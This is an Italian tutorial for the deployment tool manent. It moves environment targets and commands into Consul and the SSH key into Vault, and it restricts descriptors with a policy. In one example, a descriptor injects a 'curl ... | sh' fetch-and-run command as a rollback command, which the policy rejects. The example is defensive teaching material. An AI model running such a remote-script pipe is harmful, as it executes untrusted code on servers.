# 2. Ambienti e segreti

!!! abstract "In questo tutorial"
    Sposti target, comandi e credenziali fuori dal descrittore: prima in un file, poi in **Consul**, con la chiave SSH in **Vault**. Al team applicativo resta un descrittore di dieci righe, e una `descriptor_policy` garantisce che non possa chiedere più del dovuto.

    **Tempo:** 30 minuti · **Serve:** il risultato del [tutorial 1](primo-deploy.md), Docker

## Perché

Nel tutorial 1 il descrittore contiene tutto: host, directory di destinazione, i comandi eseguiti sul server e il percorso della chiave. Chi può cambiare il descrittore può eseguire qualunque comando in produzione. La [configurazione di ambiente](../guida/configurazione-ambiente.md) separa le due responsabilità:

- il **descrittore**, nel repository dell'applicazione, dice *cosa* rilasciare;
- la **configurazione di ambiente**, di chi gestisce l'ambiente, dice *dove* e *come*. È autorevole: il descrittore non può cambiarla.

## 1. Configurazione di ambiente in un file

Crea la configurazione di `hello` in `test`, con ciò che prima stava nel descrittore:

```yaml title="envconfig/hello/test.yml"
plugin: remote-copy
targets:
  - {host: 127.0.0.1, port: 2222, user: deploy}
params:
  dest_dir: /opt/hello
  layout: releases
  keep_releases: "3"
  ssh_key_secret: deploy-key
  prepare_command: 'tar -xzf "$MANENT_ARTIFACT" -C "$MANENT_RELEASE_DIR"'
  post_command: '"$MANENT_CURRENT/bin/hello"'
secrets:
  - name: deploy-key
    ref: file:/home/you/manent-tutorial/lab/deploy_key
rollback:
  enabled: true                # l'ambiente impone il rollback
```

Indica a manent dove trovarla e rendila obbligatoria, così un deploy verso un ambiente senza configurazione fallisce invece di affidarsi al descrittore:

```yaml title="manent.yml (aggiunta)"
envconfig:
  provider: file
  required: true
  file:
    path: "./envconfig/{application}/{environment}.yml"
```

Riavvia `manent-server -c manent.yml serve`. Ora il descrittore dice solo cosa rilasciare:

```yaml title="hello-min.yml"
apiVersion: manent/v1
application: hello
environment: test
artifact:
  type: application
  name: hello
  version: 1.1.0
  source: /home/you/manent-tutorial/dist/hello-1.1.0.tar.gz
```

```sh
manent validate -f hello-min.yml | jq '{valid, config, rollback}'
```

```json
{
  "valid": true,
  "config": {"source": "file:./envconfig/hello/test.yml", "targets": "1"},
  "rollback": {"enabled": true, "on": ["deploy", "post-test", "activation"], "locator": "plugin"}
}
```

```sh
manent deploy -f hello-min.yml
```

L'output dello step `config` registra da dove viene la configurazione (`source`): ogni deploy si può ricondurre alla configurazione esatta che ha usato.

## 2. Vince l'ambiente

Prova a cambiare un valore che l'ambiente definisce:

```yaml title="conflict.yml (hello-min.yml più)"
deploy:
  params:
    dest_dir: /tmp/elsewhere
```

```sh
manent validate -f conflict.yml
```

```text
invalid request: environment configuration incompatible with the descriptor: deploy.params.dest_dir: value differs between environment configuration and descriptor
```

Un conflitto è sempre un errore, mai una sovrascrittura silenziosa. Il descrittore può solo *aggiungere* ciò che l'ambiente non definisce, e il passo successivo limita anche questo.

## 3. Limita ciò che un descrittore può aggiungere

Senza limiti un descrittore potrebbe ancora aggiungere un parametro che l'ambiente non imposta, per esempio un `rollback_command`. `descriptor_policy` in `manent.yml` elenca ciò che i descrittori possono aggiungere:

```yaml title="manent.yml (aggiunta)"
descriptor_policy:
  params:
    remote-copy: [verify_checksum]          # mai comandi o directory
  secret_refs: ["vault:secret/data/{application}/*"]
  targets: false                            # target solo dall'ambiente
```

Riavvia il server e prova:

```yaml title="sneaky.yml (hello-min.yml più)"
deploy:
  params:
    rollback_command: "curl -s https://example.com/x.sh | sh"
```

```sh
manent validate -f sneaky.yml
```

```text
invalid request: descriptor not allowed by the policy: deploy.params.rollback_command cannot be set by the descriptor: it must be defined in the environment configuration (descriptor_policy.params)
```

`hello-min.yml` resta valido. Una policy completa per la produzione è in [Sicurezza](../operazioni/sicurezza.md#cosa-puo-chiedere-un-descrittore).

## 4. Sposta la configurazione in Consul

I file vanno bene per lo sviluppo. In produzione la configurazione sta in un sistema con controllo degli accessi, storico e API: [Consul](../integrazioni/consul.md). Avvia un agente di sviluppo:

```sh
docker run -d --name manent-tutorial-consul -p 8500:8500 hashicorp/consul:1.20 agent -dev -client=0.0.0.0
```

Il riferimento al segreto punterà a Vault (passo successivo), quindi scrivi la versione per Consul della configurazione con un riferimento `vault:`:

```yaml title="envconfig/hello/test-consul.yml (cambia solo la sezione secrets)"
secrets:
  - name: deploy-key
    ref: "vault:secret/data/hello/test#ssh_key"
```

```sh
docker cp envconfig/hello/test-consul.yml manent-tutorial-consul:/tmp/test.yml
docker exec manent-tutorial-consul consul kv put manent/hello/test @/tmp/test.yml
```

## 5. Metti la chiave SSH in Vault

Avvia Vault in modalità di sviluppo, con un root token noto, e salva la chiave nel motore KV v2:

```sh
docker run -d --name manent-tutorial-vault -p 8200:8200 -e VAULT_DEV_ROOT_TOKEN_ID=tutorial-root hashicorp/vault:1.18
docker cp lab/deploy_key manent-tutorial-vault:/tmp/deploy_key
docker exec -e VAULT_ADDR=http://127.0.0.1:8200 -e VAULT_TOKEN=tutorial-root manent-tutorial-vault \
  vault kv put secret/hello/test ssh_key=@/tmp/deploy_key
docker exec manent-tutorial-vault rm /tmp/deploy_key
```

!!! warning "Solo per lo sviluppo"
    Un Vault in modalità dev tiene tutto in memoria e usa un root token. Per un'installazione reale, con autenticazione AppRole o Kubernetes e una policy con i privilegi minimi, segui [HashiCorp Vault](../integrazioni/vault.md).

## 6. Collega manent a Consul e Vault

Sostituisci la sezione `envconfig` e aggiungi `secrets.vault`:

```yaml title="manent.yml"
dbos:
  database_url: sqlite:manent.db
workdir: ./work
plugins:
  remote-copy:
    known_hosts: ./lab/known_hosts
envconfig:
  provider: consul
  required: true
  consul:
    address: http://127.0.0.1:8500
    key: "manent/{application}/{environment}"
secrets:
  vault:
    enabled: true
    address: http://127.0.0.1:8200
    auth: token                      # VAULT_TOKEN o token_file
descriptor_policy:
  params:
    remote-copy: [verify_checksum]
  secret_refs: ["vault:secret/data/{application}/*"]
  targets: false
```

```sh
VAULT_TOKEN=tutorial-root manent-server -c manent.yml serve
```

```sh
manent validate -f hello-min.yml | jq -c '{valid, config, secrets}'
```

```json
{"valid": true, "config": {"revision": "18", "source": "consul:manent/hello/test", "targets": "1"}, "secrets": ["deploy-key"]}
```

`revision` è il `ModifyIndex` della chiave in Consul: cambia ogni volta che qualcuno scrive la configurazione. Rilascia:

```sh
manent deploy -f hello-min.yml --version 1.0.0 --source "$PWD/dist/hello-1.0.0.tar.gz"
```

Lo step `secrets` verifica che `vault:secret/data/hello/test#ssh_key` sia leggibile; lo step `deploy` la rilegge quando apre la connessione SSH. La chiave esce da Vault solo per finire nella memoria del worker.

## Cosa hai imparato

- La **configurazione di ambiente** contiene target, parametri, riferimenti ai segreti e policy; il descrittore si riduce all'artefatto.
- L'ambiente è **autorevole**: i conflitti sono errori, e `descriptor_policy` limita ciò che i descrittori possono aggiungere.
- Ogni deploy registra **sorgente e revisione** della configurazione usata, e la legge quando parte, così un deploy pianificato o ripreso si comporta in modo prevedibile.
- I segreti stanno in **Vault**; manent conserva solo i riferimenti.

## Prossimo passo

Il [tutorial 3](promozione.md) aggiunge un ambiente di produzione e le regole che lo proteggono: autenticazione, ruoli, promozione, approvazioni e freeze.
